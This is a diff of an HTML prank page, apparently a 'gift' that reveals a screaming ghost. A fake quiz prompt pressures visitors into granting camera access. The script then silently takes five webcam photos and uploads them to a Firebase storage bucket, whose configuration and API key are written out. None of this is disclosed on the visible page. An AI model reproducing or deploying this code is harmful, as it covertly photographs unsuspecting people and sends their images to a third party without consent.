@@ -1,9 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Funny Website</title>
+    <title>Merged Website</title>
     <style>
         body {
             margin: 0;
@@ -17,26 +18,32 @@
             font-family: Arial, sans-serif;
             text-align: center;
         }
-        .container, .gift-container {
-            display: none;
+
+        .container {
             max-width: 600px;
         }
-        .mcq-container {
-            display: block;
-        }
+
         h1 {
             font-size: 2em;
             margin-bottom: 20px;
         }
+
         .footer-text {
             font-size: 1.2em;
             margin-top: 20px;
             color: #ccc;
         }
+
         .fallback {
             color: red;
             margin-top: 20px;
         }
+
+        /* MCQ-style permission guidance */
+        .mcq-container {
+            margin-top: 30px;
+        }
+
         .mcq-option {
             display: inline-block;
             margin: 10px;
@@ -47,10 +54,13 @@
             position: relative;
             font-size: 1.2em;
         }
+
+        /* Correct option with a revolving red rectangle */
         .mcq-option.correct {
             border: 2px solid transparent;
             position: relative;
         }
+
         .mcq-option.correct::before {
             content: '';
             position: absolute;
@@ -61,67 +71,138 @@
             border: 2px solid red;
             animation: rotateRectangle 1.5s linear infinite;
         }
+
         @keyframes rotateRectangle {
             from {
                 transform: rotate(0deg);
             }
+
             to {
                 transform: rotate(360deg);
             }
         }
+
         .error-message {
             color: red;
             font-size: 1.2em;
             margin-top: 10px;
+            display: none;
         }
-        .ghost {
+
+        /* Content styles (from the first website) */
+        .gift-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .gift-image {
+            width: 100px;
+            cursor: pointer;
+        }
+
+        .message {
+            margin: 10px;
+            font-size: 1.5em;
+        }
+
+        .ghost-container {
             display: none;
             justify-content: center;
             align-items: center;
+            height: 100vh;
         }
-        #ghost-image {
-            transition: all 1s;
+
+        .ghost-image {
+            width: 300px;
+            display: none;
         }
-        .grow {
-            transform: scale(1.5);
-        }
+
         .shake {
-            animation: shakeAnimation 0.5s infinite;
+            animation: shake 0.5s;
+            animation-iteration-count: infinite;
         }
-        @keyframes shakeAnimation {
-            0% { transform: translate(0, 0); }
-            25% { transform: translate(-5px, 5px); }
-            50% { transform: translate(5px, -5px); }
-            75% { transform: translate(-5px, -5px); }
-            100% { transform: translate(5px, 5px); }
+
+        @keyframes shake {
+            0% {
+                transform: translate(1px, 1px) rotate(0deg);
+            }
+
+            10% {
+                transform: translate(-1px, -2px) rotate(-1deg);
+            }
+
+            20% {
+                transform: translate(-3px, 0px) rotate(1deg);
+            }
+
+            30% {
+                transform: translate(3px, 2px) rotate(0deg);
+            }
+
+            40% {
+                transform: translate(1px, -1px) rotate(1deg);
+            }
+
+            50% {
+                transform: translate(-1px, 2px) rotate(-1deg);
+            }
+
+            60% {
+                transform: translate(-3px, 1px) rotate(0deg);
+            }
+
+            70% {
+                transform: translate(3px, 1px) rotate(-1deg);
+            }
+
+            80% {
+                transform: translate(-1px, -1px) rotate(1deg);
+            }
+
+            90% {
+                transform: translate(1px, 2px) rotate(0deg);
+            }
+
+            100% {
+                transform: translate(1px, -2px) rotate(-1deg);
+            }
         }
     </style>
 </head>
-<body>
-    <div class="container mcq-container" id="mcq-container">
-        <p>Please select the correct option to allow camera access:</p>
-        <div class="mcq-option correct" id="mcq-allow">Allow</div>
-        <div class="mcq-option" id="mcq-block">Block</div>
-        <div class="error-message" id="error-message" style="display: none;">Please click the "Allow" button.</div>
-        <div class="fallback" id="fallback" style="display: none;">Your browser does not support the required permissions. Please open this page in Chrome or Safari.</div>
-    </div>
 
-    <div class="container gift-container" id="gift-container">
-        <h1 id="heading">Open this Gift</h1>
-        <div id="gift" style="cursor: pointer;">
-            <img src="gift.png" alt="Gift Image" width="200">
+<body>
+    <div class="container">
+        <div class="mcq-container" id="mcq-container">
+            <p>Please select the correct option to allow camera access:</p>
+            <div class="mcq-option correct" id="mcq-allow">Allow</div>
+            <div class="mcq-option" id="mcq-block">Block</div>
+        </div>
+        <div class="error-message" id="error-message">Please click the "Allow" button.</div>
+        <div class="fallback" id="fallback" style="display: none;">Your browser does not support the required
+            permissions. Please open this page in Chrome or Safari.</div>
+
+        <!-- Original content from first website -->
+        <div class="gift-container" id="gift-container">
+            <h1>Welcome to the Fun Zone!</h1>
+            <div class="message" id="open-gift">Open this gift to reveal the surprise!</div>
+            <img src="gift.png" class="gift-image" id="gift-image" />
+            <div class="footer-text">Click on the gift above to reveal your surprise!</div>
+        </div>
+        <div class="ghost-container" id="ghost">
+            <img src="ghost.png" class="ghost-image" id="ghost-image">
         </div>
     </div>
 
-    <div class="ghost" id="ghost">
-        <img src="scary-image.png" alt="Ghost Image" id="ghost-image" width="400">
-        <audio id="scream" src="scary-sound.mp3"></audio>
-    </div>
+    <audio id="scream" src="scary.ogg"></audio>
 
     <script type="module">
+        // Import Firebase SDKs
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
         import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
 
+        // Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyBsG-hDNF8DRowgjz9WR4wVlSL398_gQyI",
             authDomain: "photos-c3ca9.firebaseapp.com",
@@ -132,16 +213,17 @@
             measurementId: "G-X7YW60B7V5"
         };
 
+        // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
         let photos = [];
         let photoCount = 0;
         const totalPhotos = 5;
-        const mcqContainer = document.getElementById('mcq-container');
-        const giftContainer = document.getElementById('gift-container');
-        const errorMessage = document.getElementById('error-message');
         const fallbackDiv = document.getElementById('fallback');
+        const mcqContainer = document.getElementById('mcq-container');
+        const errorMessage = document.getElementById('error-message');
+        const giftContainer = document.getElementById('gift-container');
 
         function showFallback() {
             fallbackDiv.style.display = 'block';
@@ -159,6 +241,7 @@
             photos.push(dataUrl);
             photoCount++;
 
+            // Once all photos are captured, upload them to Firebase
             if (photoCount === totalPhotos) {
                 uploadPhotosToFirebase();
             }
@@ -177,6 +260,7 @@
             photos.forEach((photo, index) => {
                 const photoRef = ref(storage, `photos/photo_${index + 1}.png`);
 
+                // Upload the photo as base64
                 uploadString(photoRef, photo, 'data_url').then((snapshot) => {
                     console.log('Uploaded a photo to Firebase!', snapshot);
                 }).catch((error) => {
@@ -193,83 +277,74 @@
                     localStorage.removeItem('cameraPermissionGranted');
                     showFallback();
                 } else {
+                    // Show the MCQ guidance to the user
                     mcqContainer.style.display = 'block';
                 }
-
-                result.onchange = () => {
-                    if (result.state === 'granted') {
-                        initCamera();
-                    } else if (result.state === 'denied') {
-                        showFallback();
-                    }
-                };
+            }).catch((error) => {
+                console.error('Permission query failed:', error);
+                showFallback();
             });
         }
 
-        function askForPermission() {
-            const constraints = { video: { facingMode: 'user' } };
+        function initCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    // Hide the MCQ UI and show the main content
+                    mcqContainer.style.display = 'none';
+                    giftContainer.style.display = 'flex';
 
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then(stream => {
-                    localStorage.setItem('cameraPermissionGranted', true);
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     video.play();
+
+                    // Start capturing photos
                     startPhotoCapture(video);
-                    showGiftContainer();
+
+                    // Add click event listener for the gift
+                    document.getElementById('gift-image').addEventListener('click', () => {
+                        // Reveal ghost and play sound
+                        document.getElementById('ghost-image').style.display = 'block';
+                        document.getElementById('scream').play();
+
+                        // Optional: Add some shake effect to ghost image
+                        document.getElementById('ghost-image').classList.add('shake');
+                    });
                 })
-                .catch(error => {
-                    localStorage.removeItem('cameraPermissionGranted');
+                .catch((error) => {
+                    console.error('Camera access denied:', error);
                     showFallback();
                 });
         }
 
-        function initCamera() {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                showFallback();
-                return;
-            }
-
-            const permissionGranted = localStorage.getItem('cameraPermissionGranted');
-            if (permissionGranted) {
-                askForPermission();
-            } else {
-                requestCameraPermissions();
-            }
-        }
-
-        function showGiftContainer() {
-            mcqContainer.style.display = 'none';
-            giftContainer.style.display = 'block';
-        }
-
-        window.addEventListener('beforeunload', () => {
-            localStorage.removeItem('cameraPermissionGranted');
-        });
-
+        // Event listener for Allow button
         document.getElementById('mcq-allow').addEventListener('click', () => {
-            askForPermission();
-            mcqContainer.style.display = 'none';
-            errorMessage.style.display = 'none';
+            // Request camera permissions when the user clicks Allow
+            requestCameraPermissions();
         });
 
+        // Event listener for Block button
         document.getElementById('mcq-block').addEventListener('click', () => {
-    errorMessage.style.display = 'block';
-});
+            // Show error message when the user clicks Block
+            errorMessage.style.display = 'block';
+        });
 
-document.getElementById('gift').addEventListener('click', () => {
-    document.getElementById('gift-container').style.display = 'none';
-    document.getElementById('ghost').style.display = 'flex';
-    document.getElementById('ghost-image').classList.add('grow', 'shake');
-    document.getElementById('scream').play();
-});
+        // Initial check for permissions
+        if (navigator.permissions) {
+            navigator.permissions.query({ name: 'camera' }).then((result) => {
+                if (result.state === 'granted') {
+                    initCamera();
+                } else if (result.state === 'denied') {
+                    showFallback();
+                }
+            }).catch((error) => {
+                console.error('Permission query failed:', error);
+                showFallback();
+            });
+        } else {
+            // If Permissions API is not supported, show fallback
+            showFallback();
+        }
+    </script>
+</body>
 
-// Initialize the app by showing the MCQ container
-function initApp() {
-    mcqContainer.style.display = 'block';
-    giftContainer.style.display = 'none';
-    document.getElementById('ghost').style.display = 'none';
-}
-
-// Call the initApp function to start the app
-initApp();
+</html>
